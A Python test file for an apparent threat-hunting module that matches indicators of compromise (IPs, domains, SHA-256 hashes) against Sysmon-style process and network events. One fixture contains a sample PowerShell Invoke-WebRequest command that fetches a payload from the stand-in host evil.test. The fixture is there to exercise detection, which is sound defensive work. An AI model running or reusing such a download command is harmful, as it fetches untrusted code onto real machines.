"""Phase 5d - HuntScope IOC matching tests (test-first)."""
from app.modules.huntscope.ioc_matcher import (
    IOCMatch,
    IOCMatchResult,
    match_iocs,
)
from app.modules.huntscope.parser import NormalizedEvent


def _process_event(process: str = "", cmd: str = "") -> NormalizedEvent:
    return NormalizedEvent(
        timestamp="2026-11-01T09:00:00Z",
        hostname="WKS-01",
        event_id=1,
        channel="Sysmon",
        event_type="process",
        process=process,
        command_line=cmd,
        raw={"EventID": 1},
    )


def _network_event(
    src_ip: str = "", dst_ip: str = "", dst_port: int | None = None
) -> NormalizedEvent:
    return NormalizedEvent(
        timestamp="2026-11-01T09:05:00Z",
        hostname="WKS-01",
        event_id=3,
        channel="Sysmon",
        event_type="network",
        src_ip=src_ip,
        dst_ip=dst_ip,
        dst_port=dst_port,
        raw={"EventID": 3},
    )


# ---------- dataclass shape ----------
def test_ioc_match_fields():
    ev = _network_event(dst_ip="203.0.113.10")
    m = IOCMatch(ioc="203.0.113.10", ioc_type="ipv4", field="dst_ip", event=ev)
    assert m.ioc == "203.0.113.10"
    assert m.field == "dst_ip"
    assert m.event is ev


def test_ioc_match_result_fields():
    r = IOCMatchResult(matches=[], errors=[], event_count=0, ioc_count=0)
    assert r.matches == []


# ---------- IP matching ----------
def test_ip_matches_dst_ip():
    events = [
        _network_event(dst_ip="203.0.113.10"),
        _network_event(dst_ip="8.8.8.8"),
    ]
    result = match_iocs(events, ["203.0.113.10"])
    assert len(result.matches) == 1
    m = result.matches[0]
    assert m.ioc == "203.0.113.10"
    assert m.ioc_type == "ipv4"
    assert m.field == "dst_ip"


def test_ip_matches_src_ip():
    events = [_network_event(src_ip="10.0.0.42")]
    result = match_iocs(events, ["10.0.0.42"])
    assert len(result.matches) == 1
    assert result.matches[0].field == "src_ip"


# ---------- domain / URL matching in command_line ----------
def test_domain_matches_command_line():
    events = [
        _process_event(
            cmd="powershell Invoke-WebRequest https://evil.test/payload"
        ),
    ]
    result = match_iocs(events, ["evil.test"])
    assert len(result.matches) == 1
    assert result.matches[0].ioc == "evil.test"
    assert result.matches[0].field == "command_line"


# ---------- hash matching ----------
def test_hash_matches_command_line():
    h = "a" * 64
    events = [_process_event(cmd=f"rundll32 {h}")]
    result = match_iocs(events, [h])
    assert len(result.matches) == 1
    assert result.matches[0].ioc_type == "sha256"


# ---------- multiple IOCs, dedup per (event, ioc) ----------
def test_same_ioc_matches_once_per_event():
    ev = _network_event(dst_ip="203.0.113.10", src_ip="203.0.113.10")
    result = match_iocs([ev], ["203.0.113.10"])
    assert len(result.matches) == 1


def test_multiple_iocs_on_same_event():
    ev = _process_event(cmd="connect to 203.0.113.10 and evil.test")
    result = match_iocs([ev], ["203.0.113.10", "evil.test"])
    assert len(result.matches) == 2


# ---------- no match ----------
def test_no_match_returns_empty():
    events = [_network_event(dst_ip="8.8.8.8")]
    result = match_iocs(events, ["203.0.113.10"])
    assert result.matches == []
    assert result.event_count == 1
    assert result.ioc_count == 1


# ---------- fail-soft ----------
def test_empty_ioc_skipped():
    events = [_network_event(dst_ip="203.0.113.10")]
    result = match_iocs(events, ["", "203.0.113.10"])
    assert len(result.matches) == 1
    assert len(result.errors) >= 1


def test_empty_events():
    result = match_iocs([], ["203.0.113.10"])
    assert result.matches == []
    assert result.event_count == 0
    assert result.ioc_count == 1


# ---------- explicit ioc_types override ----------
def test_explicit_ioc_types_respected():
    events = [_process_event(cmd="contact example.test")]
    result = match_iocs(
        events,
        ["example.test"],
        ioc_types={"example.test": "domain"},
    )
    assert len(result.matches) == 1
    assert result.matches[0].ioc_type == "domain"
